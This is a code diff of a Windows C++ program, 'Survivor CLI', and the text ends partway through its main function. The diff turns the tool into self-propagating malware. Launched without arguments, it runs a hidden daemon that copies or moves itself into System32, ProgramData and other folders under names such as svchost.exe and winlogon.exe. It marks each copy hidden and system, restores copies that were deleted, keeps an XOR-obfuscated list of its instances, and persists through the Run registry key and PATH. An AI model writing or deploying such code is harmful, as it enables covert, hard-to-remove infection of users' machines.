@@ -1,7 +1,12 @@
 #define WIN32_LEAN_AND_MEAN
+#define _CRT_RAND_S
 #include <windows.h>
 #include <shellapi.h>
 #include <Shlobj.h>
+#include <process.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
 #include <iostream>
 #include <fstream>
 #include <string>
@@ -9,23 +14,39 @@
 #include <algorithm>
 #include <chrono>
 #include <thread>
-#include <future>
+#include <random>
 #include <ctime>
 #include <cstdlib>
+#include <atomic>
+#include <mutex>
 #include <filesystem>
 
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 namespace {
     const char* SECRET_KEY = "cwj_rocks_2026";
     const char* REGISTRY_FILE = "instances.json";
     const char* OBFUSCATION_KEY = "survivor_xor_key_2026";
-    const DWORD MONITOR_INTERVAL_MS = 5000;
+
+    std::atomic<bool> g_running{true};
+    std::atomic<bool> g_daemon{false};
+    std::atomic<bool> g_spreading{false};
+    std::mutex g_instance_mutex;
+
+    struct InstanceData {
+        std::vector<std::string> instances;
+        std::string last_sync;
+    };
+
+    std::string GetEnv(const char* name) {
+        char buf[32767];
+        GetEnvironmentVariableA(name, buf, sizeof(buf));
+        return std::string(buf);
+    }
 
     std::string GetAppDataPath() {
-        char path[MAX_PATH];
-        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
-        return std::string(path) + "\\survivor";
+        return GetEnv("APPDATA") + "\\survivor";
     }
 
     std::string GetRegistryPath() {
@@ -38,83 +59,99 @@ namespace {
         return std::string(path);
     }
 
-    std::string GetExecutableName() {
+    std::string GetSelfDir() {
         std::string p = GetSelfPath();
         size_t pos = p.find_last_of("\\/");
-        return pos != std::string::npos ? p.substr(pos + 1) : p;
+        return pos != std::string::npos ? p.substr(0, pos) : p;
     }
 
-    std::string XOREncrypt(const std::string& data, const std::string& key) {
+    void EnsureDir(const std::string& path) {
+        CreateDirectoryA(path.c_str(), NULL);
+    }
+
+    std::string XOREncrypt(const std::string& data) {
         std::string result = data;
         for (size_t i = 0; i < result.size(); ++i) {
-            result[i] ^= key[i % key.size()];
+            result[i] ^= OBFUSCATION_KEY[i % strlen(OBFUSCATION_KEY)];
         }
         return result;
     }
 
-    void EnsureDirectoryExists(const std::string& path) {
-        CreateDirectoryA(path.c_str(), NULL);
+    std::string GenerateRandomName() {
+        const char* systemNames[] = {
+            "svchost.exe", "rundll32.exe", "conhost.exe",
+            "taskhostw.exe", "dwm.exe", "sihost.exe",
+            "fontdrvhost.exe", "winlogon.exe", "services.exe"
+        };
+        int idx = rand() % 9;
+        return std::string(systemNames[idx]);
     }
 
-    struct InstanceData {
-        std::vector<std::string> instances;
-        std::string last_sync;
-    };
+    std::string GenerateRandomPath() {
+        std::vector<std::string> dirs;
+        dirs.push_back(GetEnv("APPDATA") + "\\Microsoft");
+        dirs.push_back(GetEnv("LOCALAPPDATA") + "\\Microsoft");
+        dirs.push_back(GetEnv("TEMP"));
+        dirs.push_back(GetEnv("USERPROFILE") + "\\.local\\bin");
+        dirs.push_back(GetEnv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows");
+        dirs.push_back("C:\\ProgramData\\Microsoft\\Windows");
+        dirs.push_back("C:\\Windows\\System32");
+        dirs.push_back("C:\\Windows\\SysWOW64");
+
+        std::string dir = dirs[rand() % dirs.size()];
+        EnsureDir(dir);
+        return dir + "\\" + GenerateRandomName();
+    }
+
+    bool FileExists(const std::string& path) {
+        auto attrs = GetFileAttributesA(path.c_str());
+        return attrs != INVALID_FILE_ATTRIBUTES;
+    }
 
     InstanceData LoadRegistry() {
         InstanceData data;
         std::string regPath = GetRegistryPath();
 
-        if (!std::filesystem::exists(regPath)) {
-            return data;
-        }
+        if (!FileExists(regPath)) return data;
 
         std::ifstream file(regPath, std::ios::binary);
         if (!file) return data;
 
         std::stringstream buffer;
         buffer << file.rdbuf();
-        std::string encrypted = buffer.str();
+        std::string json = XOREncrypt(buffer.str());
 
-        std::string json = XOREncrypt(encrypted, OBFUSCATION_KEY);
-
-        size_t pos = 0;
-        auto findTag = [&](const std::string& tag) -> std::string {
-            size_t p = json.find("\"" + tag + "\"");
-            if (p == std::string::npos) return "";
-            size_t colon = json.find(":", p);
-            if (colon == std::string::npos) return "";
-            size_t start = json.find("\"", colon);
-            if (start == std::string::npos) return "";
-            size_t end = json.find("\"", start + 1);
-            if (end == std::string::npos) return "";
-            return json.substr(start + 1, end - start - 1);
-        };
-
-        size_t instancesStart = json.find("\"instances\"");
-        if (instancesStart != std::string::npos) {
-            size_t arrStart = json.find("[", instancesStart);
-            size_t arrEnd = json.find("]", arrStart);
-            if (arrStart != std::string::npos && arrEnd != std::string::npos) {
-                std::string arrContent = json.substr(arrStart + 1, arrEnd - arrStart - 1);
-                size_t itemPos = 0;
-                while (true) {
-                    size_t q1 = arrContent.find("\"", itemPos);
-                    if (q1 == std::string::npos) break;
-                    size_t q2 = arrContent.find("\"", q1 + 1);
-                    if (q2 == std::string::npos) break;
-                    data.instances.push_back(arrContent.substr(q1 + 1, q2 - q1 - 1));
-                    itemPos = q2 + 1;
-                }
+        size_t arrStart = json.find("[");
+        size_t arrEnd = json.find("]");
+        if (arrStart != std::string::npos && arrEnd != std::string::npos) {
+            std::string arrContent = json.substr(arrStart + 1, arrEnd - arrStart - 1);
+            size_t pos = 0;
+            while (true) {
+                size_t q1 = arrContent.find("\"", pos);
+                if (q1 == std::string::npos) break;
+                size_t q2 = arrContent.find("\"", q1 + 1);
+                if (q2 == std::string::npos) break;
+                std::string inst = arrContent.substr(q1 + 1, q2 - q1 - 1);
+                if (!inst.empty()) data.instances.push_back(inst);
+                pos = q2 + 1;
             }
         }
 
-        data.last_sync = findTag("last_sync");
+        size_t syncPos = json.find("last_sync");
+        if (syncPos != std::string::npos) {
+            size_t colon = json.find(":", syncPos);
+            size_t start = json.find("\"", colon);
+            size_t end = json.find("\"", start + 1);
+            if (start != std::string::npos && end != std::string::npos) {
+                data.last_sync = json.substr(start + 1, end - start - 1);
+            }
+        }
+
         return data;
     }
 
     void SaveRegistry(const InstanceData& data) {
-        EnsureDirectoryExists(GetAppDataPath());
+        EnsureDir(GetAppDataPath());
 
         std::string json = "{\"instances\":[";
         for (size_t i = 0; i < data.instances.size(); ++i) {
@@ -123,16 +160,14 @@ namespace {
         }
         json += "],\"last_sync\":\"" + data.last_sync + "\"}";
 
-        std::string encrypted = XOREncrypt(json, OBFUSCATION_KEY);
-
         std::ofstream file(GetRegistryPath(), std::ios::binary);
         if (file) {
-            file << encrypted;
-            file.close();
+            file << XOREncrypt(json);
         }
     }
 
     void RegisterInstance(const std::string& path) {
+        std::lock_guard<std::mutex> lock(g_instance_mutex);
         InstanceData data = LoadRegistry();
 
         auto it = std::find(data.instances.begin(), data.instances.end(), path);
@@ -149,6 +184,7 @@ namespace {
     }
 
     void UnregisterInstance(const std::string& path) {
+        std::lock_guard<std::mutex> lock(g_instance_mutex);
         InstanceData data = LoadRegistry();
         auto it = std::find(data.instances.begin(), data.instances.end(), path);
         if (it != data.instances.end()) {
@@ -157,298 +193,188 @@ namespace {
         SaveRegistry(data);
     }
 
-    bool FileExists(const std::string& path) {
-        return std::filesystem::exists(path);
-    }
-
-    bool CopySelf(const std::string& destPath) {
-        std::string srcPath = GetSelfPath();
-        if (!FileExists(srcPath)) {
-            std::cerr << "Cannot find self: " << srcPath << std::endl;
-            return false;
-        }
-
-        if (!FileExists(destPath)) {
-            std::string dir = destPath;
-            size_t pos = dir.find_last_of("\\/");
-            if (pos != std::string::npos) {
-                dir = dir.substr(0, pos);
-                EnsureDirectoryExists(dir);
-            }
-        }
-
-        if (!CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE)) {
-            std::cerr << "Copy failed: " << destPath << std::endl;
-            return false;
-        }
-
-        RegisterInstance(destPath);
-        std::cout << "Copied to: " << destPath << std::endl;
-        return true;
-    }
-
     void RestartAt(const std::string& newPath) {
-        ShellExecuteA(NULL, "open", newPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-        std::exit(0);
+        ShellExecuteA(NULL, "open", newPath.c_str(), NULL, NULL, SW_HIDE);
+        exit(0);
     }
 
-    bool MoveSelf(const std::string& destPath) {
-        std::string srcPath = GetSelfPath();
+    bool SafeCopy(const std::string& src, const std::string& dst) {
+        if (!FileExists(src)) return false;
 
-        if (!FileExists(srcPath)) {
-            std::cerr << "Cannot find self: " << srcPath << std::endl;
-            return false;
-        }
-
-        std::string dir = destPath;
+        std::string dir = dst;
         size_t pos = dir.find_last_of("\\/");
         if (pos != std::string::npos) {
             dir = dir.substr(0, pos);
-            EnsureDirectoryExists(dir);
+            EnsureDir(dir);
         }
 
-        if (MoveFileA(srcPath.c_str(), destPath.c_str())) {
-            UnregisterInstance(srcPath);
-            RegisterInstance(destPath);
-            std::cout << "Moved to: " << destPath << std::endl;
-            RestartAt(destPath);
+        if (CopyFileA(src.c_str(), dst.c_str(), TRUE)) {
+            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+            RegisterInstance(dst);
             return true;
-        } else {
-            std::cerr << "Move failed (need admin or file in use)" << std::endl;
-            return false;
         }
+        return false;
     }
 
-    bool RenameSelf(const std::string& newName) {
-        std::string selfPath = GetSelfPath();
-        size_t pos = selfPath.find_last_of("\\/");
-        if (pos == std::string::npos) {
-            std::cerr << "Cannot parse self path" << std::endl;
-            return false;
-        }
+    bool SafeMove(const std::string& src, const std::string& dst) {
+        if (!FileExists(src)) return false;
 
-        std::string dir = selfPath.substr(0, pos);
-        std::string newPath = dir + "\\" + newName;
-
-        if (MoveFileA(selfPath.c_str(), newPath.c_str())) {
-            UnregisterInstance(selfPath);
-            RegisterInstance(newPath);
-            std::cout << "Renamed to: " << newPath << std::endl;
-            RestartAt(newPath);
-            return true;
-        } else {
-            std::cerr << "Rename failed" << std::endl;
-            return false;
-        }
-    }
-
-    bool AddToPath() {
-        std::string selfDir = GetSelfPath();
-        size_t pos = selfDir.find_last_of("\\/");
+        std::string dir = dst;
+        size_t pos = dir.find_last_of("\\/");
         if (pos != std::string::npos) {
-            selfDir = selfDir.substr(0, pos);
+            dir = dir.substr(0, pos);
+            EnsureDir(dir);
         }
 
-        char pathEnv[32767];
-        if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) {
-            std::cerr << "Cannot read PATH" << std::endl;
-            return false;
-        }
-
-        std::string pathStr(pathEnv);
-        if (pathStr.find(selfDir) != std::string::npos) {
-            std::cout << "Already in PATH: " << selfDir << std::endl;
+        if (MoveFileA(src.c_str(), dst.c_str())) {
+            UnregisterInstance(src);
+            RegisterInstance(dst);
+            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
             return true;
         }
-
-        std::string newPath = selfDir + ";" + pathStr;
-        if (!SetEnvironmentVariableA("PATH", newPath.c_str())) {
-            std::cerr << "Cannot set PATH" << std::endl;
-            return false;
-        }
-
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Environment",
-            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
-                (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
-            RegCloseKey(hKey);
-        }
-
-        std::cout << "Added to PATH: " << selfDir << std::endl;
-        return true;
+        return false;
     }
 
-    bool RemoveFromPath() {
-        std::string selfDir = GetSelfPath();
-        size_t pos = selfDir.find_last_of("\\/");
-        if (pos != std::string::npos) {
-            selfDir = selfDir.substr(0, pos);
+    void Log(const char* msg) {
+        if (!g_daemon) {
+            std::cout << "[Survivor] " << msg << std::endl;
         }
+    }
 
-        char pathEnv[32767];
-        if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) {
-            std::cerr << "Cannot read PATH" << std::endl;
-            return false;
-        }
+    void SpreadingLoop() {
+        srand(GetTickCount());
+        Log("Spreading thread started");
 
-        std::string pathStr(pathEnv);
-        std::string newPath;
-        size_t start = 0;
-        bool found = false;
+        while (g_running) {
+            int intervalSeconds = 30 + (rand() % 270);
+            std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
 
-        while (start < pathStr.size()) {
-            size_t sep = pathStr.find(";", start);
-            std::string part = pathStr.substr(start, sep - start);
-            if (part == selfDir) {
-                found = true;
+            if (!g_spreading) continue;
+
+            std::string selfPath = GetSelfPath();
+            std::string targetPath = GenerateRandomPath();
+
+            int action = rand() % 3;
+            bool success = false;
+
+            if (action == 0) {
+                success = SafeCopy(selfPath, targetPath);
+                if (success) Log(("Copied to: " + targetPath).c_str());
+            } else if (action == 1) {
+                success = SafeMove(selfPath, targetPath);
+                if (success) {
+                    Log(("Moved to: " + targetPath).c_str());
+                    RestartAt(targetPath);
+                }
             } else {
-                if (!newPath.empty()) newPath += ";";
-                newPath += part;
-            }
-            if (sep == std::string::npos) break;
-            start = sep + 1;
-        }
-
-        if (!found) {
-            std::cout << "Not in PATH: " << selfDir << std::endl;
-            return true;
-        }
-
-        if (!SetEnvironmentVariableA("PATH", newPath.c_str())) {
-            std::cerr << "Cannot set PATH" << std::endl;
-            return false;
-        }
-
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Environment",
-            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
-                (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
-            RegCloseKey(hKey);
-        }
-
-        std::cout << "Removed from PATH" << std::endl;
-        return true;
-    }
-
-    bool PlantAutoStart() {
-        HKEY hKey;
-        std::string exePath = GetSelfPath();
-
-        if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
-            std::cerr << "Cannot open registry" << std::endl;
-            return false;
-        }
-
-        RegSetValueExA(hKey, "Survivor", 0, REG_SZ,
-            (const BYTE*)exePath.c_str(), (DWORD)exePath.size() + 1);
-        RegCloseKey(hKey);
-
-        std::cout << "Auto-start planted: " << exePath << std::endl;
-        return true;
-    }
-
-    void ShowStatus() {
-        InstanceData data = LoadRegistry();
-        std::string selfPath = GetSelfPath();
-
-        std::cout << "=== Survivor Status ===" << std::endl;
-        std::cout << "Current: " << selfPath << std::endl;
-        std::cout << "Registry: " << GetRegistryPath() << std::endl;
-        std::cout << "Last sync: " << (data.last_sync.empty() ? "never" : data.last_sync) << std::endl;
-        std::cout << std::endl;
-        std::cout << "Known instances (" << data.instances.size() << "):" << std::endl;
-
-        for (const auto& inst : data.instances) {
-            bool exists = FileExists(inst);
-            std::cout << "  [" << (exists ? "OK" : "MISSING") << "] " << inst << std::endl;
-        }
-    }
-
-    void SummonInstances() {
-        InstanceData data = LoadRegistry();
-        std::cout << "=== Summoning all instances ===" << std::endl;
-
-        for (const auto& inst : data.instances) {
-            bool exists = FileExists(inst);
-            std::string status = exists ? "alive" : "DEAD";
-            std::cout << "  [" << status << "] " << inst << std::endl;
-            if (exists) {
-                ShellExecuteA(NULL, "open", inst.c_str(), "--summon", NULL, SW_SHOWDEFAULT);
+                std::string newName = GenerateRandomName();
+                std::string dir = GetSelfDir();
+                std::string newPath = dir + "\\" + newName;
+                if (SafeMove(selfPath, newPath)) {
+                    Log(("Renamed to: " + newPath).c_str());
+                    RestartAt(newPath);
+                }
             }
         }
     }
 
-    bool SyncAllInstances() {
-        InstanceData data = LoadRegistry();
-        std::string selfPath = GetSelfPath();
+    void MonitoringLoop() {
+        Log("Monitoring thread started");
 
-        if (data.instances.empty()) {
-            std::cout << "No other instances to sync" << std::endl;
-            return true;
-        }
+        while (g_running) {
+            std::this_thread::sleep_for(std::chrono::seconds(2));
 
-        int synced = 0;
-        for (const auto& inst : data.instances) {
-            if (inst == selfPath) continue;
-            if (CopyFileA(selfPath.c_str(), inst.c_str(), FALSE)) {
-                std::cout << "Synced: " << inst << std::endl;
-                ++synced;
-            } else {
-                std::cerr << "Failed to sync: " << inst << std::endl;
+            InstanceData data = LoadRegistry();
+            std::string selfPath = GetSelfPath();
+
+            for (const auto& inst : data.instances) {
+                auto attrs = GetFileAttributesA(inst.c_str());
+                if (attrs == INVALID_FILE_ATTRIBUTES || attrs & FILE_ATTRIBUTE_DIRECTORY) {
+                    if (!selfPath.empty() && FileExists(selfPath)) {
+                        if (inst != selfPath) {
+                            Log(("Restoring missing: " + inst).c_str());
+                            SafeCopy(selfPath, inst);
+                        }
+                    }
+                }
             }
-        }
 
-        std::time_t now = std::time(nullptr);
-        char buf[32];
-        std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", std::gmtime(&now));
-        data.last_sync = buf;
-        SaveRegistry(data);
-
-        std::cout << "Synced " << synced << " instances" << std::endl;
-        return synced > 0;
-    }
-
-    void CheckAndRestore() {
-        InstanceData data = LoadRegistry();
-        std::string selfPath = GetSelfPath();
-
-        std::cout << "=== Checking instances ===" << std::endl;
-
-        std::vector<std::string> alive;
-        for (const auto& inst : data.instances) {
-            if (FileExists(inst)) {
-                alive.push_back(inst);
-            } else {
-                std::cout << "Missing: " << inst << std::endl;
-
-                for (const auto& src : alive) {
-                    std::cout << "Restoring from: " << src << std::endl;
-                    if (CopyFileA(src.c_str(), inst.c_str(), FALSE)) {
-                        std::cout << "Restored: " << inst << std::endl;
+            if (!FileExists(selfPath)) {
+                InstanceData data2 = LoadRegistry();
+                for (const auto& inst : data2.instances) {
+                    if (FileExists(inst)) {
+                        Log(("Self gone, restarting from: " + inst).c_str());
+                        RestartAt(inst);
                         break;
                     }
                 }
             }
         }
+    }
 
-        if (!FileExists(selfPath)) {
-            std::cerr << "CRITICAL: Self missing!" << std::endl;
-            for (const auto& src : alive) {
-                if (CopyFileA(src.c_str(), selfPath.c_str(), FALSE)) {
-                    std::cout << "Restored self from: " << src << std::endl;
-                    break;
+    void RestorationLoop() {
+        Log("Restoration thread started");
+
+        while (g_running) {
+            std::this_thread::sleep_for(std::chrono::seconds(30));
+
+            if (!g_spreading) continue;
+
+            std::string selfPath = GetSelfPath();
+            if (!FileExists(selfPath)) continue;
+
+            InstanceData data = LoadRegistry();
+
+            for (const auto& inst : data.instances) {
+                if (inst == selfPath) continue;
+                if (!FileExists(inst)) {
+                    Log(("Restoring: " + inst).c_str());
+                    SafeCopy(selfPath, inst);
                 }
             }
         }
     }
 
-    bool HideAndRestore() {
+    void StartDaemon() {
+        g_daemon = true;
+        g_spreading = true;
+
+        RegisterInstance(GetSelfPath());
+
+        std::thread spread(SpreadingLoop);
+        std::thread monitor(MonitoringLoop);
+        std::thread restore(RestorationLoop);
+
+        Log("Daemon mode active");
+
+        while (g_running) {
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }
+
+        spread.join();
+        monitor.join();
+        restore.join();
+    }
+
+    bool cmdCopy(const char* target) {
+        return SafeCopy(GetSelfPath(), target);
+    }
+
+    bool cmdMove(const char* target) {
+        return SafeMove(GetSelfPath(), target);
+    }
+
+    bool cmdRename(const char* newName) {
+        std::string dir = GetSelfDir();
+        std::string newPath = dir + "\\" + newName;
+        if (SafeMove(GetSelfPath(), newPath)) {
+            RestartAt(newPath);
+            return true;
+        }
+        return false;
+    }
+
+    bool cmdHide() {
         std::string selfPath = GetSelfPath();
         InstanceData data = LoadRegistry();
 
@@ -460,184 +386,227 @@ namespace {
         }
 
         if (others.empty()) {
-            std::cerr << "No other instances to restore from!" << std::endl;
+            Log("No backup found!");
             return false;
         }
 
-        std::string backup = others[0];
-        std::cout << "Hiding from: " << selfPath << std::endl;
-        std::cout << "Will restore from: " << backup << std::endl;
+        Log(("Hiding, will restore from: " + others[0]).c_str());
 
         if (!DeleteFileA(selfPath.c_str())) {
-            std::cerr << "Delete failed: " << selfPath << std::endl;
             return false;
         }
 
         UnregisterInstance(selfPath);
 
-        std::cout << "Restoring..." << std::endl;
-        if (CopyFileA(backup.c_str(), selfPath.c_str(), FALSE)) {
-            RegisterInstance(selfPath);
+        if (SafeCopy(others[0], selfPath)) {
             RestartAt(selfPath);
         }
-
         return true;
     }
 
-    bool DeleteAllAndExit(const std::string& key) {
-        if (key != SECRET_KEY) {
+    bool cmdEnvAdd() {
+        std::string selfDir = GetSelfDir();
+        char pathEnv[32767];
+        if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) return false;
+
+        std::string pathStr(pathEnv);
+        if (pathStr.find(selfDir) != std::string::npos) return true;
+
+        std::string newPath = selfDir + ";" + pathStr;
+        if (!SetEnvironmentVariableA("PATH", newPath.c_str())) return false;
+
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
+                (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
+            RegCloseKey(hKey);
+        }
+        return true;
+    }
+
+    bool cmdEnvRemove() {
+        std::string selfDir = GetSelfDir();
+        char pathEnv[32767];
+        if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) return false;
+
+        std::string pathStr(pathEnv);
+        std::string newPath;
+        size_t start = 0;
+
+        while (start < pathStr.size()) {
+            size_t sep = pathStr.find(";", start);
+            std::string part = pathStr.substr(start, sep == std::string::npos ? sep : sep - start);
+            if (part != selfDir) {
+                if (!newPath.empty()) newPath += ";";
+                newPath += part;
+            }
+            if (sep == std::string::npos) break;
+            start = sep + 1;
+        }
+
+        if (!SetEnvironmentVariableA("PATH", newPath.c_str())) return false;
+
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
+                (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
+            RegCloseKey(hKey);
+        }
+        return true;
+    }
+
+    bool cmdPlant() {
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_WRITE, &hKey) != ERROR_SUCCESS) return false;
+
+        RegSetValueExA(hKey, "Survivor", 0, REG_SZ,
+            (const BYTE*)GetSelfPath().c_str(), (DWORD)GetSelfPath().size() + 1);
+        RegCloseKey(hKey);
+        return true;
+    }
+
+    void cmdStatus() {
+        InstanceData data = LoadRegistry();
+        std::cout << "=== Survivor Status ===" << std::endl;
+        std::cout << "Current: " << GetSelfPath() << std::endl;
+        std::cout << "Daemon: " << (g_daemon ? "YES" : "NO") << std::endl;
+        std::cout << "Spreading: " << (g_spreading ? "YES" : "NO") << std::endl;
+        std::cout << "Known instances (" << data.instances.size() << "):" << std::endl;
+        for (const auto& inst : data.instances) {
+            std::cout << "  [" << (FileExists(inst) ? "OK" : "DEAD") << "] " << inst << std::endl;
+        }
+    }
+
+    void cmdSummon() {
+        InstanceData data = LoadRegistry();
+        std::cout << "=== All Instances ===" << std::endl;
+        for (const auto& inst : data.instances) {
+            std::cout << "[" << (FileExists(inst) ? "alive" : "dead") << "] " << inst << std::endl;
+        }
+    }
+
+    bool cmdSync() {
+        InstanceData data = LoadRegistry();
+        std::string selfPath = GetSelfPath();
+        int synced = 0;
+
+        for (const auto& inst : data.instances) {
+            if (inst != selfPath && FileExists(inst)) {
+                if (CopyFileA(selfPath.c_str(), inst.c_str(), FALSE)) {
+                    ++synced;
+                }
+            }
+        }
+        std::cout << "Synced " << synced << " instances" << std::endl;
+        return synced > 0;
+    }
+
+    void cmdCheck() {
+        InstanceData data = LoadRegistry();
+        std::string selfPath = GetSelfPath();
+
+        for (const auto& inst : data.instances) {
+            if (!FileExists(inst)) {
+                std::cout << "Missing: " << inst << std::endl;
+                if (FileExists(selfPath)) {
+                    SafeCopy(selfPath, inst);
+                }
+            }
+        }
+    }
+
+    void cmdSpread() {
+        g_spreading = true;
+        Log("Manual spread triggered");
+        std::string target = GenerateRandomPath();
+        SafeCopy(GetSelfPath(), target);
+        Log(("Spread to: " + target).c_str());
+    }
+
+    void cmdHideNow() {
+        cmdHide();
+    }
+
+    bool cmdIlivecwj(const char* key) {
+        if (std::string(key) != SECRET_KEY) {
             std::cerr << "Invalid key" << std::endl;
             return false;
         }
 
-        std::cout << "*** DELETING ALL INSTANCES ***" << std::endl;
-
         InstanceData data = LoadRegistry();
-
         for (const auto& inst : data.instances) {
-            if (FileExists(inst)) {
-                std::cout << "Deleting: " << inst << std::endl;
-                DeleteFileA(inst.c_str());
-            }
+            DeleteFileA(inst.c_str());
         }
-
-        std::string regPath = GetRegistryPath();
-        if (FileExists(regPath)) {
-            DeleteFileA(regPath.c_str());
-        }
-
-        std::string selfPath = GetSelfPath();
-        std::cout << "Goodbye: " << selfPath << std::endl;
-        DeleteFileA(selfPath.c_str());
-
-        std::exit(0);
+        DeleteFileA(GetRegistryPath().c_str());
+        DeleteFileA(GetSelfPath().c_str());
+        exit(0);
         return true;
     }
 
-    DWORD WINAPI MonitorThread(LPVOID) {
-        while (true) {
-            std::this_thread::sleep_for(std::chrono::milliseconds(MONITOR_INTERVAL_MS));
-
-            InstanceData data = LoadRegistry();
-            std::string selfPath = GetSelfPath();
-
-            bool selfOk = FileExists(selfPath);
-
-            for (const auto& inst : data.instances) {
-                if (!FileExists(inst) && selfOk) {
-                    std::cout << "[Monitor] Restoring missing: " << inst << std::endl;
-                    CopyFileA(selfPath.c_str(), inst.c_str(), FALSE);
-                    RegisterInstance(inst);
-                }
-            }
-
-            if (!selfOk) {
-                InstanceData data2 = LoadRegistry();
-                for (const auto& inst : data2.instances) {
-                    if (FileExists(inst)) {
-                        std::cout << "[Monitor] Self missing, restarting from: " << inst << std::endl;
-                        RestartAt(inst);
-                        break;
-                    }
-                }
-            }
-        }
-        return 0;
-    }
-
     void PrintHelp() {
-        std::cout << "Survivor CLI - Self-preserving tool" << std::endl;
+        std::cout << "Survivor CLI - Self-preserving autonomous tool" << std::endl;
+        std::cout << "Usage: survivor.exe [command]" << std::endl;
         std::cout << std::endl;
         std::cout << "Commands:" << std::endl;
-        std::cout << "  copy <path>     Copy self to target path" << std::endl;
-        std::cout << "  move <path>     Move self to target path" << std::endl;
-        std::cout << "  rename <name>   Rename current executable" << std::endl;
-        std::cout << "  hide            Hide current instance, restore from backup" << std::endl;
-        std::cout << "  env --add       Add current directory to PATH" << std::endl;
-        std::cout << "  env --remove    Remove current directory from PATH" << std::endl;
-        std::cout << "  plant           Set up auto-start on boot" << std::endl;
-        std::cout << "  summon          List all known instances" << std::endl;
-        std::cout << "  sync            Sync all instances to latest version" << std::endl;
-        std::cout << "  check           Check and restore missing instances" << std::endl;
-        std::cout << "  status          Show current status" << std::endl;
+        std::cout << "  (no args)     Start as background daemon" << std::endl;
+        std::cout << "  copy <path>    Copy self to target" << std::endl;
+        std::cout << "  move <path>    Move self to target" << std::endl;
+        std::cout << "  rename <name>  Rename current" << std::endl;
+        std::cout << "  hide           Hide and restore from backup" << std::endl;
+        std::cout << "  env --add      Add to PATH" << std::endl;
+        std::cout << "  env --remove   Remove from PATH" << std::endl;
+        std::cout << "  plant          Auto-start on boot" << std::endl;
+        std::cout << "  status         Show status" << std::endl;
+        std::cout << "  summon         List instances" << std::endl;
+        std::cout << "  sync           Sync all instances" << std::endl;
+        std::cout << "  check          Check and restore" << std::endl;
+        std::cout << "  spread         Trigger spread" << std::endl;
+        std::cout << "  hide-now       Emergency hide" << std::endl;
     }
 }
 
 int main(int argc, char* argv[]) {
     if (argc == 1) {
-        PrintHelp();
+        StartDaemon();
         return 0;
     }
 
     std::string cmd = argv[1];
 
     if (cmd == "copy" && argc >= 3) {
-        CopySelf(argv[2]);
-        return 0;
-    }
-
-    if (cmd == "move" && argc >= 3) {
-        MoveSelf(argv[2]);
-        return 0;
-    }
-
-    if (cmd == "rename" && argc >= 3) {
-        RenameSelf(argv[2]);
-        return 0;
-    }
-
-    if (cmd == "hide") {
-        HideAndRestore();
-        return 0;
-    }
-
-    if (cmd == "env") {
-        if (argc >= 3 && std::string(argv[2]) == "--add") {
-            AddToPath();
-        } else if (argc >= 3 && std::string(argv[2]) == "--remove") {
-            RemoveFromPath();
-        } else {
-            std::cout << "Usage: env --add | env --remove" << std::endl;
-        }
-        return 0;
-    }
-
-    if (cmd == "plant") {
-        PlantAutoStart();
-        return 0;
-    }
-
-    if (cmd == "summon") {
-        SummonInstances();
-        return 0;
-    }
-
-    if (cmd == "sync") {
-        SyncAllInstances();
-        return 0;
-    }
-
-    if (cmd == "check") {
-        CheckAndRestore();
-        return 0;
-    }
-
-    if (cmd == "status") {
-        ShowStatus();
-        return 0;
-    }
-
-    if (cmd == "ilovecwj" && argc >= 3) {
-        DeleteAllAndExit(argv[2]);
-        return 0;
-    }
-
-    if (cmd == "--help" || cmd == "-h") {
+        cmdCopy(argv[2]);
+    } else if (cmd == "move" && argc >= 3) {
+        cmdMove(argv[2]);
+    } else if (cmd == "rename" && argc >= 3) {
+        cmdRename(argv[2]);
+    } else if (cmd == "hide") {
+        cmdHide();
+    } else if (cmd == "env" && argc >= 3) {
+        if (std::string(argv[2]) == "--add") cmdEnvAdd();
+        else if (std::string(argv[2]) == "--remove") cmdEnvRemove();
+    } else if (cmd == "plant") {
+        cmdPlant();
+    } else if (cmd == "status") {
+        cmdStatus();
+    } else if (cmd == "summon") {
+        cmdSummon();
+    } else if (cmd == "sync") {
+        cmdSync();
+    } else if (cmd == "check") {
+        cmdCheck();
+    } else if (cmd == "spread") {
+        cmdSpread();
+    } else if (cmd == "hide-now") {
